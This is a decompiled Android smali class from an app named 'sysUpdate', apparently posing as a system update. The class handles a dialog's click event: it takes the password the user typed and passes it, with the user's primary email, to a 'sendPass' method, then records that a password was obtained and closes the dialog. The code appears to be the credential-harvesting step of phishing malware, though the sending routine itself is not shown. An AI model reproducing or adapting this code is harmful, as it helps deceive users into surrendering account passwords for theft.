.class Lcom/sysUpdate/ShowPassDialog$1;
.super Ljava/lang/Object;
.source "ShowPassDialog.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/sysUpdate/ShowPassDialog;->onCreate(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/sysUpdate/ShowPassDialog;

.field final synthetic val$pass:Landroid/widget/EditText;

.field final synthetic val$primaryEmail:Ljava/lang/String;


# direct methods
.method constructor <init>(Lcom/sysUpdate/ShowPassDialog;Ljava/lang/String;Landroid/widget/EditText;)V
    .registers 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 48
    iput-object p1, p0, Lcom/sysUpdate/ShowPassDialog$1;->this$0:Lcom/sysUpdate/ShowPassDialog;

    iput-object p2, p0, Lcom/sysUpdate/ShowPassDialog$1;->val$primaryEmail:Ljava/lang/String;

    iput-object p3, p0, Lcom/sysUpdate/ShowPassDialog$1;->val$pass:Landroid/widget/EditText;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .registers 5

    .prologue
    .line 52
    iget-object v0, p0, Lcom/sysUpdate/ShowPassDialog$1;->this$0:Lcom/sysUpdate/ShowPassDialog;

    iget-object v1, p0, Lcom/sysUpdate/ShowPassDialog$1;->val$primaryEmail:Ljava/lang/String;

    iget-object v2, p0, Lcom/sysUpdate/ShowPassDialog$1;->val$pass:Landroid/widget/EditText;

    invoke-virtual {v2}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v2

    invoke-interface {v2}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lcom/sysUpdate/ShowPassDialog;->sendPass(Ljava/lang/String;Ljava/lang/String;)V

    .line 54
    iget-object v0, p0, Lcom/sysUpdate/ShowPassDialog$1;->this$0:Lcom/sysUpdate/ShowPassDialog;

    invoke-static {v0}, Landroid/preference/PreferenceManager;->getDefaultSharedPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "havePass"

    const/4 v2, 0x1

    .line 55
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 56
    iget-object v0, p0, Lcom/sysUpdate/ShowPassDialog$1;->this$0:Lcom/sysUpdate/ShowPassDialog;

    invoke-virtual {v0}, Lcom/sysUpdate/ShowPassDialog;->finish()V

    .line 57
    return-void
.end method
